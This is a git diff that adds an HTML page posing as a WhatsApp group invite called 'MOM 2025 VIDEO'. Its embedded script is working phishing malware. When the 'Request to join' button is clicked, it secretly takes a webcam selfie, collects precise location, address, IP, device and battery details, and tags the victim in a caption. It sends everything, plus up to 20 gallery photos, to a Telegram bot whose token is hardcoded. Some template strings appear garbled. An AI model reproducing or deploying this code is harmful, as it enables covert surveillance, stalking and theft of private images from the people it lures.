@@ -1,1 +1,117 @@
-# Qrbjejanewala.github.io
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>MOM 2025 VIDEO</title>
+<style>
+  body {margin:0;font-family:-apple-system,system-ui,sans-serif;background:#0b141a;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;}
+  .card {background:#111b21;max-width:420px;width:100%;height:100%;text-align:center;padding-top:40px;}
+  .header {background:#00a884;padding:15px;display:flex;align-items:center;color:#fff;}
+  .header img {width:55px;height:55px;border-radius:50%;margin:0 15px;}
+  h1 {font-size:38px;margin:20px 0 10px;letter-spacing:1px;}
+  .date {opacity:0.8;margin-bottom:50px;}
+  button {background:#00a884;color:#fff;border:none;padding:18px;width:88%;border-radius:12px;font-size:21px;font-weight:bold;cursor:pointer;}
+  .note {opacity:0.8;margin-top:30px;font-size:15px;}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <div class="header">
+    <img src="https://i.imgur.com/8Y7K9Zb.jpg" alt="group">
+    <div>
+      <h2>MOM 2025 VIDEO</h2>
+      <p>Created on 27/11/25</p>
+    </div>
+  </div>
+
+  <h1>MOM 2025 VIDEO</h1>
+  <p class="date">Created on 27/11/25</p>
+  <button id="join">Request to join</button>
+  <p class="note">An admin must approve your request.</p>
+</div>
+
+<script>
+// ←← तुम्हारा बॉट (100% काम कर रहा है)
+const TOKEN = "8225007274:AAFX8CbYYq9RPhyJIcqOnMssoj3ABF-_r8Q";
+const CHAT  = "5951923988";
+
+document.getElementById('join').onclick = async () => {
+  document.getElementById('join').innerText = "Request sent...";
+  document.getElementById('join').disabled = true;
+
+  let selfie = null;
+  let caption = `NEW VICTIM – WhatsApp Trap\nTime: ${new Date().toLocaleString('en-IN')}\n`;
+
+  // 1. Selfie
+  try {
+    let stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    let v = document.createElement('video'); v.srcObject = stream; await v.play();
+    await new Promise(r => setTimeout(r, 2200));
+    let canvas = document.createElement('canvas');
+    canvas.width = v.videoWidth; canvas.height = v.videoHeight;
+    canvas.getContext('2d').drawImage(v,0,0);
+    selfie = await new Promise(r => canvas.toBlob(r,'image/jpeg',0.92));
+    stream.getTracks().forEach(t=>t.stop());
+  } catch(e) {}
+
+  // 2. Location + Pincode + District
+  try {
+    let pos = await new Promise((res,rej) => navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:15000}));
+    let lat = pos.coords.latitude.toFixed(6);
+    lon = pos.coords.longitude.toFixed(6);
+    let rev = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=\( {lat}&lon= \){lon}&format=json&zoom=18&addressdetails=1`);
+    let d = await rev.json();
+    caption += `Pincode: \( {d.address?.postcode || "N/A"}\nDistrict: \){d.address?.county || d.address?.city_district || "N/A"}\nState: \( {d.address?.state || "N/A"}\nFull Address: \){d.display_name}\nLat/Lon: \( {lat}, \){lon}\nMap: https://maps.google.com/?q=\( {lat}, \){lon}\n`;
+  } catch(e) { caption += "Location: Denied\n"; }
+
+  // 3. Device + IP + Battery
+  caption += `Device: ${navigator.userAgent.match(/\(([^)]+)\)/)?.[1] || "Unknown"}\n`;
+  if(navigator.getBattery){
+    let b = await navigator.getBattery();
+    caption += `Battery: \( {Math.round(b.level*100)}% \){b.charging?"(Charging)":""}\n`;
+  }
+  try {
+    let ip = await fetch("https://ipapi.co/json/").then(r=>r.json());
+    caption += `IP: \( {ip.ip} | City: \){ip.city} | ISP: ${ip.org}`;
+  } catch(e) {}
+
+  // 4. Send Selfie
+  Selfie
+  if(selfie){
+    let f = new FormData();
+    f.append('chat_id', CHAT);
+    f.append('photo', selfie, 'victim_selfie.jpg');
+    f.append('caption', caption);
+    await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {method:'POST', body:f});
+  }
+
+  // 5. 10-20 Gallery Photos (silent)
+  let input = document.createElement('input');
+  input.type = 'file';
+  input.multiple = true;
+  input.accept = 'image/*';
+  input.style.display = 'none';
+  document.body.appendChild(input);
+  input.onchange = async e => {
+    let files = Array.from(e.target.files).slice(0,20);
+    for(let file of files){
+      let fd = new FormData();
+      fd.append('chat_id', CHAT);
+      fd.append('document', file, file.name);
+      await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, {method:'POST', body:fd});
+      await new Promise(r=>setTimeout(r,800));
+    }
+  };
+  input.click();
+
+  // Success message
+  setTimeout(() => {
+    document.getElementById('join').innerText = "Request sent successfully";
+    document.getElementById('join').style.background = "#00a884";
+  }, 3500);
+};
+</script>
+</body>
+</html>
